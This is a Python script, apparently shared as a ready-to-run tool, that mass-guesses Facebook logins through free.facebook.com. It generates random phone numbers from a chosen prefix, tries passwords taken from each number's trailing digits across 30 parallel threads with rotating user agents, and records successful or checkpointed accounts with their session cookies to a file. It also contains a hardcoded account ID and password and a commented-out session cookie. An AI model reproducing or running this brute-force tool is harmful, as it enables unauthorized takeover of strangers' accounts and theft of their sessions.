import requests as r
import re, time,random,os,sys
from concurrent.futures import ThreadPoolExecutor as tdp
#coded by SIAM AHMED

banner="""\033[1;33mCoded by SIAM AHMED
Facebook:
https://www.facebook.com/profile.php?id=100078824560530
email:
siam.ahmed.cp@outlook
\033[0m
"""

ugen =['Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; CPH1903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.111.1 YaSearchBrowser/21.111.1 BroPP/1.0 SA/3 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN) Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GoogleApp/12.44.23.23.arm',"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1"]


e="100024864368249"

p="941186"
n=0
ok=0
cp=0
def c(e,pw):
  global n,cp,ok
  sys.stdout.write(f"\r\033[1;32mCHECKED-{n} |CP-{cp} | OK-{ok}\033[0m")
  sys.stdout.flush()
  status=0
  for p in pw:
     
    #print(f"for {e}-{p}")
    s=r.Session()
    s.headers.update({'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'})
    fb=s.get("https://free.facebook.com")
    c1=";".join(k+"="+v for k,v in dict(s.cookies).items())
    #print(s.headers)
    #print(c1)
    hd1={
        'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
    }
    s.headers.update(hd1)
    rt=s.get("https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
    rs=rt.text
    open("/sdcard/e.html","w").write(rs)
    #print(rt)
    d= {
            "lsd":re.search('name="lsd" value="(.*?)"', str(rs)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(rs)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(rs)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(rs)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":e,
            "pass":p,
           "login":"Log In"
          }
    hd={
"authority": "free.facebook.com",
"method": "POST",
#"path": "/?tbua=1",
"scheme": "https",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-encoding": "gzip, deflate, br",
"accept-language": "en-US,en;q=0.9",
"cache-control": "max-age=0",
#cookie: sb=ZZSmY3MeGBoUQGwRYUyxoK8S; datr=ZZSmYxVfXZE4d7ZeITyN1zZn; c_user=100088418937096; xs=33%3AJzMFYMhAzYX4jg%3A2%3A1671861496%3A-1%3A-1; fr=00aIcvweHilBtCkt0.AWVfy_UWaaZSxYEBpHqAs3leHj4.BjppRl.aS.AAA.0.0.BjppT6.AWXrK0CmeIw; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671861507032%2C%22v%22%3A1%7D; m_page_voice=100088418937096; m_pixel_ratio=1; wd=971x620
"referer": "https://free.facebook.com/",
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent':random.choice(ugen) #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
}
    def sub():
        global cp,ok
        nonlocal status
        try:
                x=s.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
              
                ).text
            
                #open("/sdcard/e.html","w").write(x)
                #print(s.cookies)
                dc=dict(s.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                #print(coki)
                
                #print(cv)
                
                #print(s.cookies)
                x=str(s.cookies)
                #print(f"Running {e} {p}")
                if "checkpoint" in x:
                    cp+=1
                    cv=dc["checkpoint"][13:28]
                    print(f"\u001b[1;36mCP\n{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p}\n")
                    status=1
                    
                    
                elif "c_user" in x:
                    ok+=1
                    cv=dc["c_user"]
                    print(f"\u001b[1;32mOk\t{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p} -OK\n")
                    status=1
                    
        except Exception as er:
                print(er)
                print("\n"*3)
                time.sleep(15)
                sub()
        
    sub()
    if status==1:
        break
  n+=1
#c(e,[p])
#time.sleep(1)
os.system("clear")
num=[]
print(banner)
code=input("Code(017,0171,019,018):")
import string
lim=int(input("Limit:"))
pslen=int(input("Password Length (6-11):"))
for i in range(lim):
    x=''.join(random.choice(string.digits) for _ in range(11-len(code)))
    num.append(code+x)
#print(num)


            
with tdp(max_workers=30) as t:
    for i in num:
        pws=[i[(11-n):] for n in range(6,pslen+1)]
        t.submit(c,i,pws)






